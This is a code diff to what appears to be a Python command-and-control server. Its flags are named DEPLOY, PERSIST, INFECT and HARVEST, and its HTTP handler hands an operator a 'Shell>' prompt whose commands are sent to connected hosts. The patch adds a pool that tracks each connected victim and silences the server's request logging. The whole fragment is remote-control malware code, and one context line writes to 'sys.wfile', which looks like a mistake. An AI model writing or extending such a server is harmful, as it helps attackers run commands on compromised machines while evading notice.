@@ -47,6 +47,7 @@ DEPLOY = False
 PERSIST = False
 INFECT = False
 HARVEST = False
+conn_pool = {}
 
 # The first argument passed to aphix is the port number.  
 def setPortNumber(portnum):
@@ -73,6 +74,7 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
 		#for i in dir(self):
 		#	print(i)
 		host, port = self.client_address
+		conn_pool[host+':'+str(port)]=self
 		command = input('{%s} Shell> ' % host)
 		self.send_response(200)
 		self.send_header("Content-type", "text/html")
@@ -91,6 +93,9 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
 						time.sleep(.3)
 						count += 1
 		sys.wfile.write(command.encode())
+		
+	def log_message(self, format, *args):
+		return
 
 
 	def do_POST(self):
